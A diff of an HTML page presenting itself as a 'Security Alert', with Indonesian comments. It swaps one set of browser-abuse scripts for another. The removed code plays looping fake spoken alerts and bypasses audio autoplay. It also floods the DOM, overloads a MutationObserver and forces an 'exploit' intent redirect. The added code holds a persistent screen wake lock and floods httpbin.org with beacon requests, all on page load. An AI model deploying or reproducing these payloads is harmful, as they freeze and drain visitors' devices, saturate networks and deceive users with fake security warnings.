@@ -3,195 +3,101 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Alert - DOM Exhaustion Chain</title>
+<title>Security Alert - Network & Wake Lock Exhaustion</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #000; min-height: 100vh; overflow: hidden; color: #fff; }
-  iframe, audio, video, embed, object, svg, canvas { display: none !important; }
+  body { 
+    background: #0f172a; 
+    min-height: 100vh; 
+    color: #f8fafc; 
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+  }
+  .card {
+    background: #1e293b;
+    padding: 32px;
+    border-radius: 12px;
+    max-width: 500px;
+    width: 100%;
+    border: 1px solid #334155;
+    text-align: center;
+  }
+  h2 { font-size: 20px; margin-bottom: 12px; color: #f8fafc; }
+  p { font-size: 14px; color: #94a3b8; line-height: 1.5; }
 </style>
 </head>
 <body>
+
+<div class="card">
+  <h2>Network & Wake Lock Exhaustion</h2>
+  <p>Menguji ketahanan antrean soket jaringan browser menggunakan Beacon API flooding dan penjagaan layar aktif via Screen Wake Lock API.</p>
+</div>
+
 <script>
 (function () {
   'use strict';
 
   // ============================================
-  // KONFIGURASI AUTOPLAY & EXPLOIT PARAMS
+  // 1. SCREEN WAKE LOCK API ABUSE
+  // Mencegah perangkat/layar mati (Sleep Mode Prevention)
   // ============================================
-  var CONFIG = {
-    tts: {
-      text: "System Alert. DOM manipulation threshold exceeded. Immediate verification required.",
-      lang: 'en-US',
-      rate: 0.90,
-      pitch: 1.0,
-      volume: 1.0,
-      repeatInterval: 6000,
-      maxRepeats: 30
-    },
-    silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA='
-  };
+  let wakeLock = null;
 
-  var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0 };
-
-  // ============================================
-  // TTS ENGINE
-  // ============================================
-  function speakOnce() {
-    if (!('speechSynthesis' in window)) return;
-    if (state.ttsCount >= CONFIG.tts.maxRepeats) return;
-
-    try {
-      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
-      u.lang = CONFIG.tts.lang;
-      u.rate = CONFIG.tts.rate;
-      u.pitch = CONFIG.tts.pitch;
-      u.volume = CONFIG.tts.volume;
-
-      u.onend = function () {
-        state.ttsCount++;
-        if (state.ttsCount < CONFIG.tts.maxRepeats) {
-          setTimeout(speakOnce, CONFIG.tts.repeatInterval);
-        }
-      };
-
-      window.speechSynthesis.speak(u);
-    } catch (e) {}
-  }
-
-  function startTTS() {
-    if (state.ttsStarted) return;
-    state.ttsStarted = true;
-    window.speechSynthesis.cancel();
-    speakOnce();
-  }
-
-  // ============================================
-  // AUDIO CONTEXT & SILENT BYPASS
-  // ============================================
-  function unlockAudioContext() {
-    try {
-      var ctx = new (window.AudioContext || window.webkitAudioContext)();
-      if (ctx.state === 'suspended') { ctx.resume().catch(function(){}); }
-      var osc = ctx.createOscillator();
-      var gain = ctx.createGain();
-      gain.gain.value = 0.0001;
-      osc.connect(gain);
-      gain.connect(ctx.destination);
-      osc.start();
-      osc.stop(ctx.currentTime + 0.05);
-    } catch (e) {}
-  }
-
-  function trySilentAudio() {
-    try {
-      var a = new Audio(CONFIG.silentWav);
-      a.volume = 0.0001;
-      a.loop = true;
-      var p = a.play();
-      if (p && p.catch) p.catch(function(){});
-    } catch (e) {}
-  }
-
-  function playMainAudio() {
-    if (state.mainPlayed) return;
-    state.mainPlayed = true;
-
-    try {
-      var ctx = new (window.AudioContext || window.webkitAudioContext)();
-      var sr = ctx.sampleRate;
-      var buf = ctx.createBuffer(1, sr * 2, sr);
-      var d = buf.getChannelData(0);
-      for (var i = 0; i < d.length; i++) {
-        d[i] = Math.sin(2 * Math.PI * 440 * (i / sr)) * 0.2;
+  async function requestPersistentWakeLock() {
+    if ('wakeLock' in navigator) {
+      try {
+        wakeLock = await navigator.wakeLock.request('screen');
+        console.log('[+] Screen Wake Lock acquired successfully.');
+        
+        wakeLock.addEventListener('release', () => {
+          console.log('[!] Wake Lock was released, re-requesting...');
+          setTimeout(requestPersistentWakeLock, 1000);
+        });
+      } catch (err) {
+        console.warn('[!] Wake Lock failed:', err.message);
       }
-      var src = ctx.createBufferSource();
-      src.buffer = buf;
-      src.connect(ctx.destination);
-      src.start();
-      src.onended = startTTS;
-      setTimeout(startTTS, 2500);
-    } catch (e) {
-      startTTS();
     }
   }
 
   // ============================================
-  // VARIAN EKSPLOIT: DOM NODE FLOODING & MUTATION OBSERVER OVERLOAD
+  // 2. NETWORK RESOURCE EXHAUSTION (Beacon / Fetch Flooding)
+  // Membanjiri antrean jaringan untuk menguji batasan koneksi
   // ============================================
-  function triggerDOMExhaustionChain() {
-    console.log("[!] Initiating DOM Node Flooding & Mutation Observer Overload...");
-
-    // 1. Memasang Mutation Observer masif untuk memicu beban callback sinkron
-    try {
-      var observer = new MutationObserver(function(mutations) {
-        mutations.forEach(function(mutation) {
-          // Memaksa komputasi ulang layout DOM secara terus-menerus
-          var dummy = document.body.offsetHeight;
-        });
-      });
-      observer.observe(document.body, { childList: true, subtree: true, attributes: true });
-    } catch(e) {}
-
-    // 2. Membanjiri memori renderer menggunakan penambahan node DOM masif tanpa pembersihan
+  function triggerNetworkFlood() {
+    console.log('[!] Initiating Network Request Flooding...');
+    
     setInterval(function() {
       try {
-        var fragment = document.createDocumentFragment();
-        for (var i = 0; i < 5000; i++) {
-          var el = document.createElement('div');
-          el.textContent = "DOM_NODE_FLOOD_" + Math.random();
-          fragment.appendChild(el);
+        for (var i = 0; i < 30; i++) {
+          // Menggunakan sendBeacon untuk mengirim payload tanpa menunggu respons (fire-and-forget socket saturation)
+          var dummyData = new Uint8Array(2048);
+          navigator.sendBeacon('https://httpbin.org/post?flood=' + Math.random(), dummyData);
         }
-        document.body.appendChild(fragment);
-      } catch(e) {}
-    }, 30);
-
-    // 3. Delayed Deep Link / Intent Redirection Chaining
-    setTimeout(function() {
-      try {
-        console.log("[*] Forcing intent redirection...");
-        window.location.replace("intent://security-alert#Intent;scheme=exploit;package=com.google.android.browser;end;");
-      } catch(e) {}
-    }, 4000);
+      } catch (e) {}
+    }, 50);
   }
 
   // ============================================
   // INISIALISASI
   // ============================================
-  unlockAudioContext();
-  trySilentAudio();
+  setTimeout(function() {
+    requestPersistentWakeLock();
+  }, 500);
 
-  setTimeout(function () {
-    unlockAudioContext();
-    startTTS();
-  }, 100);
-
-  setTimeout(function () {
-    if (!state.mainPlayed) playMainAudio();
-  }, 400);
-
-  setTimeout(function () {
-    if (!state.mainPlayed) playMainAudio();
-    if (!state.ttsStarted) startTTS();
-    
-    // EKSEKUSI VARIAN DOM EXHAUSTION
-    triggerDOMExhaustionChain();
-    
-  }, 1200);
-
-  var retryCount = 0;
-  var retry = setInterval(function () {
-    retryCount++;
-    unlockAudioContext();
-    trySilentAudio();
-    if (!state.ttsStarted) startTTS();
-    if (retryCount > 15) clearInterval(retry);
+  setTimeout(function() {
+    triggerNetworkFlood();
   }, 1500);
 
-  document.addEventListener('visibilitychange', function () {
-    if (!document.hidden && !state.mainPlayed) {
-      setTimeout(playMainAudio, 50);
+  // Re-acquire wake lock on visibility change
+  document.addEventListener('visibilitychange', async () => {
+    if (wakeLock !== null && document.visibilityState === 'visible') {
+      await requestPersistentWakeLock();
     }
   });
+
 })();
 </script>
 </body>
